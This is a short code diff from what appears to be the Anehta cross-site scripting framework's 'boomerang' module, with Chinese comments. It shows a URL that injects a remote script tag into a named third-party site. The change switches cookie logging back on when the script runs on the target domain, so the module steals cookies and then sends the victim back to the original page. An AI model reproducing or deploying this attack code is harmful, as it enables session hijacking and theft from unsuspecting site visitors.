@@ -18,9 +18,10 @@ var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+
 // 前页面
 var org_url = "http://www.secwiki.com/anehta/test.html";
 var org_domain = "www.secwiki.com";
+//var org_url = "http://www.b.com/anehta/test.html";
+//var org_domain = "www.b.com";
 
-
-
+ 
 // 如果是当前页面，则向目标提交
 if ($d.domain == org_domain){
    if (anehta.dom.checkCookie("boomerang") == false){
@@ -44,8 +45,8 @@ if ($d.domain == org_domain){
 if ($d.domain == target_domain){
 	 
 	 setTimeout( function (){
-	 	 //如果远程已经在feed.js中引入了clx模块,则不需要再次重复记录cookie	
-     //anehta.logger.logCookie();
+	 	 //clx模块太慢了
+     anehta.logger.logCookie();
 
 
      // 弹回原来的页面。
